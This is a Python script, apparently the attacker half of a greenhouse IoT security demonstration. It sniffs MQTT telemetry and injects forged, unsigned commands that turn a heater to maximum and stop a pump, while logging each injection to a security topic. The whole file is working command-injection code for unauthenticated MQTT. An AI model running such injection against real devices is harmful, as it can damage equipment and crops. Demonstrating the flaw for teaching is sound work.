"""Attacker: sniffs telemetry and injects forged unsigned commands."""
import json
import random
import threading
import time

import paho.mqtt.client as mqtt

from src.config import (MQTT_HOST, MQTT_PORT, TELEMETRY_INTERVAL, TOPIC_ATTACK,
                        TOPIC_COMMANDS, TOPIC_SECURITY, TOPIC_TELEMETRY)

attacking = False

FAKE_COMMANDS = [
    {"action": "heater", "value": 100},
    {"action": "pump", "value": False},
]


def on_connect(client, *_):
    client.subscribe(TOPIC_TELEMETRY)
    client.subscribe(TOPIC_ATTACK)
    print("[hacker] connected, sniffing greenhouse traffic...")


def on_message(client, _userdata, msg) -> None:
    global attacking
    text = msg.payload.decode("utf-8", "replace")

    if msg.topic == TOPIC_ATTACK:
        attacking = json.loads(text).get("on", False)
        print(f"[hacker] attack {'STARTED' if attacking else 'stopped'}")
        return

    if not attacking:
        return
    try:
        data = json.loads(text)
        print(f"[hacker] sniffed: temp={data['temp']:.1f}C humidity={data['humidity']:.1f}%")
    except (json.JSONDecodeError, KeyError):
        pass


def attack_loop(client) -> None:
    while True:
        if attacking:
            cmd = random.choice(FAKE_COMMANDS)
            client.publish(TOPIC_COMMANDS, json.dumps(cmd))
            client.publish(TOPIC_SECURITY, json.dumps({"event": "injection", "action": cmd["action"]}))
            print(f"[hacker] INJECTED forged command (unsigned): {cmd}")
        time.sleep(TELEMETRY_INTERVAL)


def main() -> None:
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="hacker")
    client.on_connect = on_connect
    client.on_message = on_message
    client.connect(MQTT_HOST, MQTT_PORT)
    threading.Thread(target=attack_loop, args=(client,), daemon=True).start()
    client.loop_forever()


if __name__ == "__main__":
    main()